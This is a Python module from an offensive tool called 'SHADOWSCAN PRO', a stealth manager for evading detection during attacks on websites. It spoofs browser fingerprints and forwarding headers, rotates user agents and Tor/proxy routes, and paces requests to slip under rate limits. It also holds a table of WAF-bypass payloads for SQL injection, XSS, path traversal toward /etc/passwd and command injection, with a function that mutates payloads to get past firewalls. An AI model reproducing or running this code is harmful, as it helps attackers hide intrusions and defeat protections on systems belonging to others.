"""
SHADOWSCAN PRO - Stealth Manager
Advanced evasion and anonymity techniques
Developed by ROHAIB TECHNICAL | +92 306 3844400
"""

import asyncio
import random
import time
import hashlib
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from datetime import datetime
import logging

logger = logging.getLogger(__name__)


@dataclass
class StealthProfile:
    """Stealth configuration profile"""
    name: str
    tor_enabled: bool = False
    vpn_enabled: bool = False
    proxy_rotation: bool = False
    user_agent_rotation: bool = True
    fingerprint_randomization: bool = True
    request_jitter: bool = True
    rate_limit_evasion: bool = True
    waf_bypass: bool = True
    encryption_layer: str = "tls"
    noise_generation: bool = False
    detection_score: float = 0.0


class StealthManager:
    """Manages all stealth and evasion capabilities"""
    
    # Stealth profiles
    PROFILES = {
        "ghost": StealthProfile(
            name="ghost",
            tor_enabled=True,
            vpn_enabled=True,
            proxy_rotation=True,
            user_agent_rotation=True,
            fingerprint_randomization=True,
            request_jitter=True,
            rate_limit_evasion=True,
            waf_bypass=True,
            encryption_layer="tor+tls",
            noise_generation=True,
            detection_score=0.05
        ),
        "shadow": StealthProfile(
            name="shadow",
            tor_enabled=True,
            vpn_enabled=False,
            proxy_rotation=True,
            user_agent_rotation=True,
            fingerprint_randomization=True,
            request_jitter=True,
            rate_limit_evasion=True,
            waf_bypass=True,
            encryption_layer="tor",
            noise_generation=False,
            detection_score=0.15
        ),
        "stealth": StealthProfile(
            name="stealth",
            tor_enabled=False,
            vpn_enabled=True,
            proxy_rotation=True,
            user_agent_rotation=True,
            fingerprint_randomization=False,
            request_jitter=True,
            rate_limit_evasion=True,
            waf_bypass=False,
            encryption_layer="tls",
            noise_generation=False,
            detection_score=0.30
        ),
        "loud": StealthProfile(
            name="loud",
            tor_enabled=False,
            vpn_enabled=False,
            proxy_rotation=False,
            user_agent_rotation=False,
            fingerprint_randomization=False,
            request_jitter=False,
            rate_limit_evasion=False,
            waf_bypass=False,
            encryption_layer="none",
            noise_generation=False,
            detection_score=0.80
        )
    }
    
    # User agent database
    USER_AGENTS = {
        "chrome_win": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "chrome_mac": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "chrome_linux": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "firefox_win": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "firefox_mac": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
        "safari": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "edge": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "opera": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
        "brave": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Brave/1.60.0",
        "mobile_ios": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "mobile_android": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    }
    
    # WAF bypass techniques
    WAF_BYPASS = {
        "sql_injection": [
            ("/*!50000%75%6e%69%6f%6e*/", "MySQL comment bypass"),
            ("%55%4e%49%4f%4e", "URL encoded UNION"),
            ("uNioN", "Case variation"),
            ("UN/**/ION", "Inline comment"),
            ("UNION%0aSELECT", "Newline injection"),
            ("' || '1'='1", "Alternative OR"),
        ],
        "xss": [
            ("<scRipT>", "Case variation"),
            ("<img src=x onerror=alert(1)>", "IMG tag"),
            ("<svg onload=alert(1)>", "SVG tag"),
            ("<body onload=alert(1)>", "Body onload"),
            ("<details open ontoggle=alert(1)>", "Details tag"),
            ("javascript:alert(1)", "JavaScript protocol"),
        ],
        "path_traversal": [
            ("....//", "Double dot bypass"),
            ("..%252f..%252f", "Double encoding"),
            ("..%c0%af", "Unicode encoding"),
            ("/etc/passwd%00", "Null byte"),
        ],
        "command_injection": [
            (";id", "Semicolon"),
            ("|id", "Pipe"),
            ("`id`", "Backticks"),
            ("$(id)", "Dollar substitution"),
            ("%0aid", "Newline"),
        ]
    }
    
    # Fingerprint parameters
    FINGERPRINTS = {
        "screen_resolutions": [
            (1920, 1080), (1366, 768), (1536, 864), (1440, 900),
            (2560, 1440), (3840, 2160), (1280, 720), (1680, 1050)
        ],
        "color_depths": [24, 32, 30],
        "pixel_ratios": [1.0, 1.25, 1.5, 2.0],
        "timezones": [
            "America/New_York", "America/Chicago", "America/Denver",
            "America/Los_Angeles", "Europe/London", "Europe/Paris",
            "Asia/Tokyo", "Australia/Sydney"
        ],
        "languages": [
            ["en-US", "en"], ["en-GB", "en"], ["en-US", "en", "es"],
            ["en-US", "en", "fr"], ["en-US", "en", "de"]
        ],
        "platforms": ["Win32", "MacIntel", "Linux x86_64"],
        "hardware_concurrency": [2, 4, 8, 12, 16, 24, 32],
        "device_memory": [2, 4, 8, 16, 32],
    }
    
    def __init__(self, profile_name: str = "stealth"):
        self.profile = self.PROFILES.get(profile_name, self.PROFILES["stealth"])
        self.current_ua = None
        self.current_fingerprint = None
        self.request_count = 0
        self.last_request_time = 0
        self.proxies = []
        self.tor_available = False
        self.vpn_available = False
        
        # Generate initial fingerprint
        self.rotate_fingerprint()
    
    def set_profile(self, profile_name: str):
        """Change stealth profile"""
        if profile_name in self.PROFILES:
            self.profile = self.PROFILES[profile_name]
            logger.info(f"Stealth profile changed to: {profile_name}")
    
    def get_user_agent(self) -> str:
        """Get user agent (with rotation if enabled)"""
        if self.profile.user_agent_rotation:
            return random.choice(list(self.USER_AGENTS.values()))
        
        if not self.current_ua:
            self.current_ua = self.USER_AGENTS["chrome_win"]
        
        return self.current_ua
    
    def rotate_fingerprint(self) -> Dict:
        """Generate new browser fingerprint"""
        if not self.profile.fingerprint_randomization:
            if self.current_fingerprint:
                return self.current_fingerprint
        
        fingerprint = {
            "screen_resolution": random.choice(self.FINGERPRINTS["screen_resolutions"]),
            "color_depth": random.choice(self.FINGERPRINTS["color_depths"]),
            "pixel_ratio": random.choice(self.FINGERPRINTS["pixel_ratios"]),
            "timezone": random.choice(self.FINGERPRINTS["timezones"]),
            "languages": random.choice(self.FINGERPRINTS["languages"]),
            "platform": random.choice(self.FINGERPRINTS["platforms"]),
            "hardware_concurrency": random.choice(self.FINGERPRINTS["hardware_concurrency"]),
            "device_memory": random.choice(self.FINGERPRINTS["device_memory"]),
            "canvas_hash": hashlib.md5(str(random.random()).encode()).hexdigest(),
            "webgl_hash": hashlib.md5(str(random.random()).encode()).hexdigest(),
            "audio_hash": hashlib.md5(str(random.random()).encode()).hexdigest(),
        }
        
        self.current_fingerprint = fingerprint
        return fingerprint
    
    def get_headers(self) -> Dict[str, str]:
        """Get HTTP headers with stealth modifications"""
        headers = {
            "User-Agent": self.get_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": ",".join(
                f"{lang};q={1.0 - i*0.1}" 
                for i, lang in enumerate(self.current_fingerprint["languages"])
            ) if self.current_fingerprint else "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0",
        }
        
        # Add spoofed headers for realism
        if self.profile.fingerprint_randomization:
            headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers["X-Real-IP"] = headers["X-Forwarded-For"]
        
        return headers
    
    async def apply_request_jitter(self):
        """Apply jitter to requests to avoid detection"""
        if self.profile.request_jitter:
            base_delay = 0.5
            jitter = random.uniform(0, base_delay * 0.5)
            await asyncio.sleep(base_delay + jitter)
    
    async def evade_rate_limit(self):
        """Evade rate limiting"""
        if self.profile.rate_limit_evasion:
            self.request_count += 1
            current_time = time.time()
            
            # Adaptive delays
            if self.request_count > 50:
                await asyncio.sleep(random.uniform(2.0, 5.0))
                self.request_count = 0
            elif self.request_count % 10 == 0:
                await asyncio.sleep(random.uniform(1.0, 2.0))
            
            self.last_request_time = current_time
    
    def bypass_waf(self, payload: str, attack_type: str) -> List[str]:
        """Generate WAF bypass payloads"""
        if not self.profile.waf_bypass:
            return [payload]
        
        bypassed_payloads = []
        
        if attack_type in self.WAF_BYPASS:
            for bypass_pattern, _ in self.WAF_BYPASS[attack_type]:
                if attack_type == "sql_injection":
                    bypassed = payload.replace("UNION", bypass_pattern)
                elif attack_type == "xss":
                    bypassed = bypass_pattern
                else:
                    bypassed = payload + bypass_pattern
                
                bypassed_payloads.append(bypassed)
        
        # Add original payload
        if payload not in bypassed_payloads:
            bypassed_payloads.insert(0, payload)
        
        return bypassed_payloads
    
    def generate_noise(self) -> bytes:
        """Generate network noise to mask real traffic"""
        if not self.profile.noise_generation:
            return b""
        
        # Generate random noise
        noise_size = random.randint(100, 1000)
        noise = bytes([random.randint(0, 255) for _ in range(noise_size)])
        
        return noise
    
    def get_proxy_config(self) -> Optional[Dict]:
        """Get proxy configuration"""
        if not self.profile.proxy_rotation:
            return None
        
        proxy_url = None
        
        if self.profile.tor_enabled and self.tor_available:
            proxy_url = "socks5://127.0.0.1:9050"
        elif self.profile.vpn_enabled and self.vpn_available:
            proxy_url = "http://127.0.0.1:8080"
        elif self.proxies:
            proxy_url = random.choice(self.proxies)
        
        if proxy_url:
            return {
                "http": proxy_url,
                "https": proxy_url
            }
        
        return None
    
    def add_proxy(self, proxy_url: str):
        """Add proxy to rotation pool"""
        if proxy_url not in self.proxies:
            self.proxies.append(proxy_url)
    
    def remove_proxy(self, proxy_url: str):
        """Remove proxy from rotation"""
        if proxy_url in self.proxies:
            self.proxies.remove(proxy_url)
    
    def check_tor_availability(self) -> bool:
        """Check if Tor is available"""
        import socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex(('127.0.0.1', 9050))
            sock.close()
            self.tor_available = (result == 0)
            return self.tor_available
        except:
            return False
    
    def get_status(self) -> Dict:
        """Get current stealth status"""
        return {
            "profile": self.profile.name,
            "tor_enabled": self.profile.tor_enabled,
            "tor_available": self.tor_available,
            "vpn_enabled": self.profile.vpn_enabled,
            "vpn_available": self.vpn_available,
            "proxy_count": len(self.proxies),
            "user_agent_rotation": self.profile.user_agent_rotation,
            "fingerprint_randomization": self.profile.fingerprint_randomization,
            "waf_bypass": self.profile.waf_bypass,
            "detection_score": self.profile.detection_score,
            "current_ua": self.current_ua[:50] + "..." if self.current_ua else None,
            "requests_made": self.request_count
        }
    
    def get_available_profiles(self) -> List[Dict]:
        """Get all available stealth profiles"""
        return [
            {
                "name": name,
                "description": f"Detection score: {profile.detection_score:.0%}",
                "features": {
                    "TOR": profile.tor_enabled,
                    "VPN": profile.vpn_enabled,
                    "Proxy Rotation": profile.proxy_rotation,
                    "UA Rotation": profile.user_agent_rotation,
                    "Fingerprint Random": profile.fingerprint_randomization,
                    "WAF Bypass": profile.waf_bypass,
                }
            }
            for name, profile in self.PROFILES.items()
        ]